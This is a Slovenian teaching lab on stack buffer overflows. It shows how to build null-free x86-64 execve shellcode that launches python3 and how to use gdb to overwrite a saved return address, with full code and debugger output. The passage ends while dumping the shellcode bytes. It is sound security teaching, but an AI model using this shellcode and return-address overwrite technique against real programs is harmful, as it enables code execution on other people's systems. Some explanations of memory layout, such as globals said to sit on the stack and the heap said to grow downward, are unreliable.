# 10. Vaja: Prekoračitev medpomnilnika

## Navodila

1. Izvedite napad s prekoračitve medpomnilnika v enostavnem programu.

## Dodatne informacije

## Podrobna navodila

### 1. Prekoračitev medpomnilnika

Izvedli bomo napad s prekoračitvijo medpomnilnika v enostavnem programu, ki je bolj podrobno opisan v članku [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf).

Danes uporabljamo preventivne večopravilne operacijske sisteme (preemptive multitasking operating systems). Preventivna večopravilnost je postopek, v katerem operacijski sistem računalnika uporablja določena merila, ki odločijo, kako dolgo lahko kateri koli program uporablja operacijski sistem, preden drugi program prav tako dobi priložnost uporabiti operacijski sistem. Dejanje prevzemanja uporabe operacijskega sistema med enim in drugim programom se imenuje preventivnost (preemption). Pogost kriterij za preventivnost je preprosto pretečeni čas izvajanja programa. V nekaterih operacijskih sistemih lahko nekateri programi dobijo višjo prioriteto kot drugi programi, kar jim omogoča nadzor nad tem kdaj pridobijo in za kako dolgo imajo na voljo uporabo operacijskega sistema.

V računalniku imamo [zunanje naprave, pomnilnik in procesor](https://en.wikipedia.org/wiki/Von_Neumann_architecture), ki izvaja programe iz pomnilnika. V procesorju [ukazni ali programski števec (instruction pointer (IP) or program counter (PC))](https://en.wikipedia.org/wiki/Program_counter) kaže na celico v pomnilniku, ki vsebuje trenutni ukaz izbranega programa, ki se izvaja. Procesor lahko zunanje naprave prekinjajo. Ena izmed takih naprav je števec, ki v praksi pogosti sproži [prekinitev (interrupt)](https://en.wikipedia.org/wiki/Interrupt) izvajanja trenutnega programa. Ob določeni prekinitvi lahko procesor skoči na kos programske kode, ki predstavlja operacijski sistem, ki vsebuje med drugim tudi [tabelo procesov](https://www.geeksforgeeks.org/process-table-and-process-control-block-pcb/). 

Tabela procesov ima za vsak proces enolični identifikator ter podatke o procesu, ki med drugim vsebujejo tudi lokacijo ukaza v pomnilniku pri katerem se je proces nazadnje vstavil.

Ob časovni prekinitvi se izvajanje trenutnega procesa prekine in procesor skoči na izvajanje programske kode operacijskega sistema, ki pogleda v tabelo procesov, kateri proces se bo izvajal naslednji in nastavi ukazni števec na lokacijo zadnjega ukaza pri katerem se je proces vstavil pri prejšnjem izvajanju. Tako procesor sedaj začne izvajanje novega procesa naprej od točke, kjer se je predhodno ustavil.

Ko proces želi prebrati datoteko, izvede poseben ukaz za branje datoteke, ki izvajanje procesa ustavi in zaprosi operacijski sistem za datoteko. Ko operacijski sistem naloži zahtevano datoteko v pomnilnik, nato ponovno požene izvajanje procesa, seveda šele, ko pride na vrsto s strani drugih procesov. Med tem, ko je proces bil ustavljen in je čakal na datoteko je operacijski sistem prepustil izvajanje drugim procesom.

Ukaz za izvedbo sistemskega klica je [`INT 0x80`](https://blog.packagecloud.io/the-definitive-guide-to-linux-system-calls/) na Intel 32-bitnih procesorjih, ki poganjajo 32-bitni operacijski sistem. `INT` nam določi prekinitev, `0x80` pa številko prekinitve, ki v tem primeru prestavlja sistemski klic.

Ko proces želi izvesti določeno funkcionalnost, ki jo ponuja operacijski sistem, izvede ukaz za sistemski klic (`syscall`). Na primer za odpiranje datoteke, pisanje v datoteko, odpiranje povezave preko omrežja, zagon programa... 

Pri 32-bitnih operacijskih sistemih prožimo prekinitev `int` za sistemski klic, kateri podamo v registru `eax` številko sistemskega klica, ki ga želimo izvesti ter parametre v ostalih registrih (`ebx`, `ecx`, `edx`, `esi` in `edi`) ali pa jih prenesemo preko sklada (stack). Sistemski klici so predhodno določeni ter so opisani v [tabeli 32-bitnih sistemskimi klicev](https://syscalls32.paolostivanin.com/).

Pri 64-bitnih operacijskih sistemih ne prožimo vče prekinitve, vendar kar pokličemo ukaz `syscall` in mu podamo številko klica, ki ga želimo izvesti v register `rax`, parametri pa sledijo v ostalih registrih (`rdi`, `rsi`, `rdx`, `r1`, `r8` in `r9`). Sistemski klici so opisani v [tabeli 64-bitnih sistemskimi klicev](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

Sedaj napišemo program v programskem jeziku C, ki bo zagnal nek drug program. Drug program lahko požene le preko sistemskega klica [`exec`](https://en.wikipedia.org/wiki/Exec_(system_call)).

V splošnem poženemo program takole `program file1 -d rw 1` in ob zagonu ima program podane naslednje stvari:

- Seznam argumentov (`args`), kjer prvi argument z indeksom nič vedno predstavlja ime programa: [`program`, `file1`, `-d`, `rw`, `1`].
- Odprte tri standardne datoteke (`file descriptors`): 0 - standard vhod (`stdin`), 1 -  standard izhod (`stdout`) in 2 - standardni izhod napak (`stderr`).
- Okoljske spremenljivke okolja v katerem se izvaja program (`env`).

Napišemo kratek program v programskem jeziku C, ki bo pognal ukazno lupino programskega jezika `python`. Ker želimo slediti splošnemu izvajanju programov, izberemo funkcijo `execve` za zagon drugega programa iz programa samega:

    int execve(char const *path, char const *argv[], char const *envp[]);

    nano program.c

    #include <unistd.h>

    int main(int argc, char *argv[]) {
        execve("/usr/bin/python3", NULL, NULL);
        return 0;
    }

Program sedaj prevedemo z ukazom [`gcc`](https://manpages.org/gcc) in ga poženemo, da preverimo če deluje.

    apt update
    apt install build-essential

    gcc program.c -o program
    ./program

V programskem jeziku `python` lahko sistemske klice kličemo preko knjižnice `sys`. Sedaj pa poglejmo kodo našega programa v zbirnem jeziku.

    gcc program.c -S -o program.S
    ./program

    less program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)
        movl	$0, %edx
        movl	$0, %esi
        leaq	.LC0(%rip), %rdi
        call	execve@PLT
        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

Ukaz `call` izvede sistemski klic `exec`, ki je definiran v sistemski knjižnici, ki potem naprej izvaja sistemske klice. Nadomestili ga bomo s prekinitvijo in nastavili pravilne vrednosti v registrih, da bomo direktno izvedli enak sistemski klic. Tako, da za vrstico `.LC0(%rip), %rdi`, ki nam zapiše niz programa za zagon v register `rdi`, ki predstavlja 1. argument, zapišemo še ničle v registra `rsi` in `rdx`, ki predstavljata 2. in 3. argument. V register `rax` zapišemo številko `exec` sistemskega klica, ki je 59 ter nadomestimo vrstico `call	execve@PLT` z `syscall`. Sedaj program ponovno prevedemo in preizkusimo njegovo delovanje.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)
        movl	$0, %edx
        movl	$0, %esi

        leaq	.LC0(%rip), %rdi
        mov	    $0, %rsi
        mov	    $0, %rdx
        mov	    $59, %rax
        syscall

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Ta program želimo sedaj predstaviti kot niz, da ga lahko podamo na poljubni tekstovni vhod in poskusimo prepričati program, ki bere vhod, da ga požene. To lahko dosežemo le če poznamo kako deluje pomnilnik v računalniku. Pomnilnik si lahko predstavljamo kot veliko tabelo, kjer ima vsaka celica svoj naslov, preko katerega lahko dostopamo do nje. Celice so v tabeli urejene tako, da se zgoraj nahajajo celice z nizkimi naslovi in z visokimi naslovi spodaj. Po dogovoru se v spodnjem delu pomnilniku nahaja operacijski sistem, od vrha navzdol pa si sledijo programi.

Če pogledamo del pomnilnika, ki predstavlja program, ima le ta na vrhu pomnilnika shranjeno programsko kodo, nato sledijo konstante in dve dinamični strukturi: kopica (heap), ki je takoj za konstantami, se povečuje navzdol ter vsebuje interne spremenljivke programa; ter sklad (stack), ki se nahaja spodaj v pomnilniku programa, se povečuje navzgor ter vsebuje argumente funkcije ter globalne spremenljivke.

Ko program pokliče poljubno funkcijo, mora ob klicu shraniti naslov v pomnilniku ukaza kamor se mora vrniti, ko se funkcija izvede. Poleg vrnitvenega naslova shrani argumente ter globalne spremenljivke. Če ne pazimo, lahko vrnitveni naslov prepišemo z drugim naslovom, ki pa lahko kaže na poljuben ukaz v pomnilniku tega programa. Znotraj programa pa lahko imamo niz, ki vsebuje ukaze za zagon drugega programa. Vrnitveni naslov se nahaja po samim skladom, zato ga lahko prepišemo z manipulacijo sklada oz. razlitjem sklada (Stack-overflow).

Najprej natančneje ugotovimo kje se nahaja vrnitveni naslov, zato v naš program dodamo skok do poljubne funkcije ter vrnitev iz funkcije nazaj v program. V programu izbrišemo ukaz `leaq` saj bomo niz podali kar direktno. Potem skočimo na del programa `jumppoint`, ki izvede klic na funkcijo `myfunction`. Pri klicu funkcije s shrani naslov naslednjega ukaza na sklad in ga potem poberemo s sklada, da se lahko vrnemo nazaj.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)
        movl	$0, %edx
        movl	$0, %esi

        jmp     jumppoint
    myfunction:
        pop     %rdi
        mov	    $0, %rsi
        mov	    $0, %rdx
        mov	    $59, %rax
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Ker bo naš program predstavljen kot niz, le ta ne sme vsebovati nobene ničle, saj splošne funkcije za branje nizov pričakujejo v programskem jeziku pričakujejo posebni končni znak na koncu niza, da vedo kdaj morajo prenehati z branjem. In ta posebni končni znak vsebuje ničlo (`'\0'`). Zato nadomestimo vse ukaze, ki direktno zapisujejo ničle v registre z logično operacijo XOR. V primeru, ko zapisujemo vrednost 59 v register `rax` pa tega na moremo uporabiti, zato register najprej nastavimo na nič tako da uporabimo logično operacijo XOR in nato zapišemo vrednost 59 le v spodnji bajt registra, saj se pri tem pri prevajanju ne dodajo ničle pred vrednostjo 59 do polne dolžine registra.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)
        movl	$0, %edx
        movl	$0, %esi

        jmp     jumppoint
    myfunction:
        pop     %rdi
        xor	    %rsi, %rsi
        xor	    %rdx, %rdx
        xor     %rax, %rax
        mov	    $59, %al
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Torej imamo program, ki ga lahko podamo kot niz drugemu programu, ki bo pognal nek drug program, v našem primeru `python` interpreter. Sedaj napišimo nek program, ki bo prejel ta niz, na tak način, da mu bo povozil sklad. Izvedli bomo torej napad s prelivom sklada. Napišimo preprost program v programskem jeziku C.

    nano stacky.c

    #include <stdio.h>

    int callme(int a, unsigned long *b){
        unsigned long *f;
        /* Add something here so that we jump over line: c = c + e */
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -o stacky
    ./stacky
    
    c: 16

Želimo da, ko se vračamo iz funkcije, skočimo direktno na ukaz `printf` in tako preskočimo vrstic `c = c + e;`. To bomo dosegli tako, da bomo pokvarili sklad. Da ugotovimo v kaj se naš program `stacky` prevede in kako se izvaja, lahko omogočimo razhroščevanje z [Debugger GDB](https://sourceware.org/gdb/). Interaktivno okolje za razhroščevanje pokličemo z ukazom [`gdb`](https://manpages.org/gdb) in nato z ukazom `run` poženemo program, z ukazom `break` nastavimo točko kjer se izvajanje ustavi, z ukazom `s` se premaknemo na naslednji ukaz in ukaz `disassemble` nam prikaže kodo v zbirnem jeziku.

    apt update
    apt install gdb

    gcc stacky.c -g -o stacky

    gdb stacky

    run

    break main

    s

    disassemble callme

    Dump of assembler code for function callme:
        0x0000555555555135 <+0>:	push   %rbp                 // Store %rbp to stack.
        0x0000555555555136 <+1>:	mov    %rsp,%rbp            // Store the value in %rsp to %rbp.
        0x0000555555555139 <+4>:	mov    %edi,-0x4(%rbp)      // Store the value in %edi 4 bytes ahead of %rbp.
        0x000055555555513c <+7>:	mov    %rsi,-0x10(%rbp)     // Store the value in %rsi 16 bytes ahead of %rbp.
        0x0000555555555140 <+11>:	mov    -0x10(%rbp),%rax     // Store the value 16 bytes ahead of %rbp to %rax.
        0x0000555555555144 <+15>:	mov    (%rax),%rax          // Store the the address of the value stored in %rax to %rax.
        0x0000555555555147 <+18>:	mov    %eax,%edx            // Store the value in %eax to %edx.
        0x0000555555555149 <+20>:	mov    -0x4(%rbp),%eax      // Store the address 4 bytes ahead of %rbp to %eax.   
        0x000055555555514c <+23>:	add    %edx,%eax            // Sum the values in %edx and %eax and write the result to %eax.
        0x000055555555514e <+25>:	pop    %rbp                 // Load the old value of %rbp from stack to %rbp.
        0x000055555555514f <+26>:	ret                         // Return to main program.
    End of assembler dump.

Ko pridemo v funkcijo `callme`, imamo na skladu shranjen naslov na katerega se moramo vrniti po zaključku funkcije (return address). Z ukazom `push` na sklad shranimo staro vrednost v registru `rbp` in nato z ukazom `mov` shranimo vrednost registra `rsp` v register `rbp`. Splošni register `rbp` (base pointer) kaže na začetek lokalnih spremenljivk oz. vrh sklada. Register `rsp` (stack pointer) prav tako kaže na vrh sklada in ga ukaza za delo s skladom `push` in `pop` implicitno popravljata. 

Registra `edi` in `rsi` predstavljata argumenta funkcije `callme`.  
Prvi argument v registru `edi` zapišemo na naslov, ki je 4 bajte nad vrednostjo registra `rbp`. Drugi argument v registru `rsi` zapišemo na naslov, ki je 16 bajtov nad vrednostjo registra `rbp`. 

Sedaj v register `rax` zapišemo vrednost, ki je 16 bajtov nad vrednostjo registra `rbp`. In v naslednjem koraku shranimo naslov vrednosti v `rax` v sam `rax`. Prav tako, shranimo vrednost v registru `eax` v register `edx` in vrednost,  ki je 4 bajte nad vrednostjo registra `rbp` shranimo v register `eax`. Sedaj še seštejemo vrednosti v registrih `edx` in `eax` ter rezultat zapišemo v `eax`.

Na koncu funkcije vrednost registra `rbp` popravimo na vrednost, ki jo je imel pred klicem funkcije ter smo jo na začetku funkcije shranili na sklad. Nato se vrnemo iz funkcije `callme` nazaj v glavni program preko vrnitvenega naslova, ki je shranjen v skladu pod staro vrednostjo `rbp`.

Pod pomnilnikom funkcije `callme` se nahaja pomnilnik glavnega programa, z njegovimi lokalnimi spremenljivkami, staro vrednostjo `rbp` in vrnitvenim naslovom, ki so uporabi, ko se program zaključi. Delu pomnilnika znotraj programa, ki vsebuje lokalne spremenljivke, staro vrednost `rbp` in vrnitveni naslov rečemo tudi okvir na skladu (stack frame).

Delovanje programa želimo spremeniti tako, da vrinemo kos kode, ki nam bo povozil vrnitveni naslov, ki je shranjen na skladu. Ugotoviti moramo kam kaže vrnitveni naslov, kaj se dogaja v glavnem programu ter ugotoviti za koliko moramo vrnitveni naslov popravit. Da to lahko naredimo, moramo dopolniti naš program. Dodamo mu konstanto `X`, ki nam prva predstavlja odmik od naslova spremenljivke `a` do naslova vrnitvenega naslova, torej 8 bajtov pod vrednostjo v registru `rsp`. Prav tako, dodamo konstanto `Y`, ki predstavlja odmik od vrnitvenega naslova do ukaza `printf`, tako da preskočimo vrstico `c = c + e;`. Spremenljivka `a` najprej pretvorimo v tip `char` zato, da nam bo konstanta `X` predstavljala odmik v bajtih in ne v celih številih. 

    nano stacky.c

    #include <stdio.h>

    #define X 66
    #define Y 66

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
        *f = *f + Y;				            // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

Sedaj uporabimo razhroščevalnik `gdb`, da lahko konstanti `X` in `Y`. Najprej bomo popravili vrstico `f = (unsigned long*)(((char*)&a) + X);`, tako da bo spremenljivka `f` vsebovala naslov v pomnilniku kjer se nahaja vrnitveni naslov. Nastavimo prekinitveno točko z ukazom `break` na začetek funkcije `callme`. Nato izvedemo par vrstic funkcije z ukazom `s`, da dobimo pravilno vrednost v register `rsp`. Sedaj lahko izpišemo programski kodo glavnega programa v zbirniku z ukazom `disassemble`. Klic funkcije `callme` se izvede z vrstico `call   0x555555555135 <callme> `, vrnitveni naslov pa kaže na naslednjo vrstic `cltq` z naslovom `0x00005555555551a3`. Za izpis vrednosti uporabimo ukaz `p` z zastavico za šestnajstiški izpis `/x` in izpišemo vrnitveni naslov v spomni na naslovu, ki je 8 bajtov za naslovom kamor kaže register `rsp`, ki mora biti enak naslovu vrstice `cltq` v glavnem delu programa. V spremenljivko `f` moramo shraniti vrednost, ki se nahaja 8 bajtov nad `rsp`. Izračunamo razliko med naslovom `&a` in naslovom, ki se nahaja 8 bajtov nad `rsp`, ki je 28 in jo shranimo v konstanto `X`. Torej če naslovu `&a` prištejemo 28, dobimo naslov, ki kaže na vrnitveni naslov.

    gdb stacky.c

    (gdb) break callme 

    Breakpoint 1 at 0x1140: file stacky.c, line 8. 

    (gdb) run 

    Starting program: /home/aleks/stacky  

    Breakpoint 1, callme (a=3, b=0x7fffffffebd0) at stacky.c:8 

    8		f = (unsigned long*)(((char*)&a) + X); 

    (gdb) s 

    9		*f = *f + Y; 

    (gdb) s 

    10		return a + *b; 

    (gdb) disassemble main 

    Dump of assembler code for function main: 

    0x000055555555516e <+0>:	push   %rbp 

    0x000055555555516f <+1>:	mov    %rsp,%rbp 

    0x0000555555555172 <+4>:	sub    $0x10,%rsp 

    0x0000555555555176 <+8>:	movl   $0x5,-0x4(%rbp) 

    0x000055555555517d <+15>:	movl   $0x3,-0x8(%rbp) 

    0x0000555555555184 <+22>:	mov    -0x4(%rbp),%edx 

    0x0000555555555187 <+25>:	mov    -0x8(%rbp),%eax 

    0x000055555555518a <+28>:	add    %edx,%eax 

    0x000055555555518c <+30>:	cltq    

    0x000055555555518e <+32>:	mov    %rax,-0x10(%rbp) 

    0x0000555555555192 <+36>:	lea    -0x10(%rbp),%rdx 

    0x0000555555555196 <+40>:	mov    -0x8(%rbp),%eax 

    0x0000555555555199 <+43>:	mov    %rdx,%rsi 

    0x000055555555519c <+46>:	mov    %eax,%edi 

    0x000055555555519e <+48>:	call   0x555555555135 <callme> 

    0x00005555555551a3 <+53>:	cltq    

    0x00005555555551a5 <+55>:	mov    %rax,-0x10(%rbp) 

    0x00005555555551a9 <+59>:	mov    -0x10(%rbp),%rax 

    0x00005555555551ad <+63>:	mov    %eax,%edx 

    0x00005555555551af <+65>:	mov    -0x4(%rbp),%eax 

    0x00005555555551b2 <+68>:	add    %edx,%eax 

    0x00005555555551b4 <+70>:	mov    %eax,-0x4(%rbp) 

    0x00005555555551b7 <+73>:	mov    -0x4(%rbp),%eax 

    0x00005555555551ba <+76>:	mov    %eax,%esi 

    0x00005555555551bc <+78>:	lea    0xe41(%rip),%rdi        # 0x555555556004 

    0x00005555555551c3 <+85>:	mov    $0x0,%eax 

    0x00005555555551c8 <+90>:	call   0x555555555030 <printf@plt> 

    0x00005555555551cd <+95>:	mov    $0x0,%eax 

    0x00005555555551d2 <+100>:	leave   

    0x00005555555551d3 <+101>:	ret     

    End of assembler dump. 

    (gdb) p/x *(unsigned long*)($rsp+8) 

    $1 = 0x5555555551a3 

    (gdb) disassemble callme 

    Dump of assembler code for function callme: 

    0x0000555555555135 <+0>:	push   %rbp 

    0x0000555555555136 <+1>:	mov    %rsp,%rbp 

    0x0000555555555139 <+4>:	mov    %edi,-0x14(%rbp) 

    0x000055555555513c <+7>:	mov    %rsi,-0x20(%rbp) 

    0x0000555555555140 <+11>:	lea    -0x14(%rbp),%rax 

    0x0000555555555144 <+15>:	add    $0x42,%rax 

    0x0000555555555148 <+19>:	mov    %rax,-0x8(%rbp) 

    0x000055555555514c <+23>:	mov    -0x8(%rbp),%rax 

    0x0000555555555150 <+27>:	mov    (%rax),%rax 

    0x0000555555555153 <+30>:	lea    0x42(%rax),%rdx 

    0x0000555555555157 <+34>:	mov    -0x8(%rbp),%rax 

    0x000055555555515b <+38>:	mov    %rdx,(%rax) 

    => 0x000055555555515e <+41>:	mov    -0x20(%rbp),%rax 

    0x0000555555555162 <+45>:	mov    (%rax),%rax 

    0x0000555555555165 <+48>:	mov    %eax,%edx 

    0x0000555555555167 <+50>:	mov    -0x14(%rbp),%eax 

    0x000055555555516a <+53>:	add    %edx,%eax 

    0x000055555555516c <+55>:	pop    %rbp 

    0x000055555555516d <+56>:	ret     

    End of assembler dump.

    $3 = (void *) 0x7fffffffebc8 

    (gdb) p &a 

    $4 = (int *) 0x7fffffffebac 

    (gdb) p (unsigned long)($rsp + 8) - (unsigned long)&a 

    $5 = 28

Sedaj popravimo vrstico `#define X 28` in prevedemo kodo ter preverimo ali spremenljivka `f` vsebuje vrnitveni naslov `0x5555555551a3`, ki kaže na ukaz `cltq`.

    nano stacky.c

    #define X 28

    gcc stacky.c -g -o stacky

    gdb stacky

    Breakpoint 1, callme (a=3, b=0x7fffffffebd0) at stacky.c:8 

    8		f = (unsigned long*)(((char*)&a) + X); 

    (gdb) s 

    9		*f = *f + Y; 

    (gdb) s 

    10		return a + *b; 

    (gdb) p $rsp 

    $1 = (void *) 0x7fffffffebc0

    (gdb) p f 

    $2 = (unsigned long *) 0x7fffffffebc8 

    (gdb) p/x *f 

    $3 = 0x5555555551e5 

V naši kodi torej spremenljivka `f` sedaj hrani naslov v pomnilniku kjer se nahaja vrnitveni naslov. Sedaj pa bomo popravili še vrstico `*f = *f + Y;`, tako da bo vrnitveni naslov kazal na ukaz `printf("c: %d\n", c);` namesto na `c = c + e;`. Ugotoviti moramo s katerim ukazom se začne izvajati klic funkcije `printf`, saj moramo pred klicem naložiti pravilne vrednosti v pravilne registre. Ob pregledu kode v zbirniku ugotovimo, da se registri za klic funkcije `printf`, začnejo pri ukazu `mov    -0x4(%rbp),%eax` na naslovu `0x5555555551b7`. Torej `Y` predstavlja razliko med naslovom ukaza `cltq`, ki je `0x5555555551a3` in naslovom ukaza `mov    -0x4(%rbp),%eax `, ki je `0x5555555551b7`.

    gdb stacky

    (gdb) p 0x00005555555551b7 - 0x00005555555551a3 

    $2 = 20 

Naslov ukaza, ki kaže na začetek klica funkcije `callme` lahko ugotovimo tudi tako, da spremenljivko `Y` nastavimo na 0 in z `gdb` izvajamo naš program z ukazom `s` in se ustavimo, ko pridemo do vrstice `c = c + e;` in nato izpišemo kodo programa z ukazom `disassemble` in pogledam na kateri naslov kaže puščica trenutnega ukaza.

    nano stacky.c

    #define Y 0

    gcc stacky.c -g -o stacky

    gdb stacky

    (gdb) break main 

    Breakpoint 1 at 0x1172: file stacky.c, line 16. 

    (gdb) run 

    Starting program: /home/aleks/stacky  

    

    Breakpoint 1, main () at stacky.c:16 

    16		c = 5; 

    (gdb) s 

    17		d = 3; 

    (gdb) s 

    18		e = c + d; 

    (gdb) s 

    19		e = callme(d, &e); 

    (gdb) s 

    callme (a=3, b=0x7fffffffebd0) at stacky.c:8 

    8		f = (unsigned long*)(((char*)&a) + X); 

    (gdb) s 

    9		*f = *f + Y; 

    (gdb) s 

    10		return a + *b; 

    (gdb) s 

    11	} 

    (gdb) s 

    main () at stacky.c:20 

    20		c = c + e; 

    (gdb) s 

    21		printf("c: %d\n", c); 

    (gdb) disassemble main 

    Dump of assembler code for function main: 

    0x000055555555516a <+0>:	push   %rbp 

    0x000055555555516b <+1>:	mov    %rsp,%rbp 

    0x000055555555516e <+4>:	sub    $0x10,%rsp 

    0x0000555555555172 <+8>:	movl   $0x5,-0x4(%rbp) 

    0x0000555555555179 <+15>:	movl   $0x3,-0x8(%rbp) 

    0x0000555555555180 <+22>:	mov    -0x4(%rbp),%edx 

    0x0000555555555183 <+25>:	mov    -0x8(%rbp),%eax 

    0x0000555555555186 <+28>:	add    %edx,%eax 

    0x0000555555555188 <+30>:	cltq    

    0x000055555555518a <+32>:	mov    %rax,-0x10(%rbp) 

    0x000055555555518e <+36>:	lea    -0x10(%rbp),%rdx 

    0x0000555555555192 <+40>:	mov    -0x8(%rbp),%eax 

    0x0000555555555195 <+43>:	mov    %rdx,%rsi 

    0x0000555555555198 <+46>:	mov    %eax,%edi 

    0x000055555555519a <+48>:	call   0x555555555135 <callme> 

    0x000055555555519f <+53>:	cltq    

    0x00005555555551a1 <+55>:	mov    %rax,-0x10(%rbp) 

    0x00005555555551a5 <+59>:	mov    -0x10(%rbp),%rax 

    0x00005555555551a9 <+63>:	mov    %eax,%edx 

    0x00005555555551ab <+65>:	mov    -0x4(%rbp),%eax 

    0x00005555555551ae <+68>:	add    %edx,%eax 

    0x00005555555551b0 <+70>:	mov    %eax,-0x4(%rbp) 

    --Type <RET> for more, q to quit, c to continue without paging-- 

    => 0x00005555555551b3 <+73>:	mov    -0x4(%rbp),%eax 

    0x00005555555551b6 <+76>:	mov    %eax,%esi 

    0x00005555555551b8 <+78>:	lea    0xe45(%rip),%rdi        # 0x555555556004 

    0x00005555555551bf <+85>:	mov    $0x0,%eax 

    0x00005555555551c4 <+90>:	call   0x555555555030 <printf@plt> 

    0x00005555555551c9 <+95>:	mov    $0x0,%eax 

    0x00005555555551ce <+100>:	leave   

    0x00005555555551cf <+101>:	ret     

    End of assembler dump. 

    (gdb) 

Sedaj popravimo vrstico `#define Y 20` in prevedemo kodo ter preverimo ali program sedaj preskoči vrstico `c = c + e;` ter nam vrne rezultat `c = 5`.

    nano stacky.c

    #define Y 20

    gcc stacky.c -g -o stacky

    ./stacky

    c: 5

Vrstico `f = (unsigned long*)(((char*)&a) + X);` lahko poenostavimo tako, da namesto z bajti delamo z 32-bitnimi celimi števili in posledično delimo vrednost konstante `X` s 4, da dobimo vrednost 7.

    nano stacky.c

    #include <stdio.h>

    #define X 7
    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = *f + Y;				    // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    ./stacky

    c: 5

Sedaj pa bomo podali še naš začetni program kot niz program `stacky.c`. Niz pridobimo tako, da program izpišemo v zbirniku z orodjem `gdb` in ga izpišemo kot niz od vključno ukaza `xor    %rsi,%rsi` do vključno z vrstico za ukazom `call`.

    gcc program.S -g -o program

    gdb program

    (gdb) disassemble main 

    Dump of assembler code for function main: 

    0x0000000000001125 <+0>:	push   %rbp 

    0x0000000000001126 <+1>:	mov    %rsp,%rbp 

    0x0000000000001129 <+4>:	sub    $0x10,%rsp 

    0x000000000000112d <+8>:	mov    %edi,-0x4(%rbp) 

    0x0000000000001130 <+11>:	mov    %rsi,-0x10(%rbp) 

    0x0000000000001134 <+15>:	mov    $0x0,%edx 

    0x0000000000001139 <+20>:	mov    $0x0,%esi 

    0x000000000000113e <+25>:	jmp    0x114e <main+41> 

    0x0000000000001140 <+27>:	pop    %rdi 

    0x0000000000001141 <+28>:	xor    %rsi,%rsi 

    0x0000000000001144 <+31>:	xor    %rdx,%rdx 

    0x0000000000001147 <+34>:	xor    %rax,%rax 

    0x000000000000114a <+37>:	mov    $0x3b,%al 

    0x000000000000114c <+39>:	syscall  

    0x000000000000114e <+41>:	call   0x1140 <main+27> 

    0x0000000000001153 <+46>:	(bad)   

    0x0000000000001154 <+47>:	jne    0x11c9 <__libc_csu_init+89> 

    0x0000000000001156 <+49>:	jb     0x1187 <__libc_csu_init+23> 

    0x0000000000001158 <+51>:	(bad)   

    0x0000000000001159 <+52>:	imul   $0x68747970,0x2f(%rsi),%ebp 

    0x0000000000001160 <+59>:	outsl  %ds:(%rsi),(%dx) 

    0x0000000000001161 <+60>:	outsb  %ds:(%rsi),(%dx) 

    0x0000000000001162 <+61>:	xor    (%rax),%eax 

    0x0000000000001164 <+63>:	mov    $0x0,%eax 

    0x0000000000001169 <+68>:	leave   

    0x000000000000116a <+69>:	ret     

    End of assembler dump. 

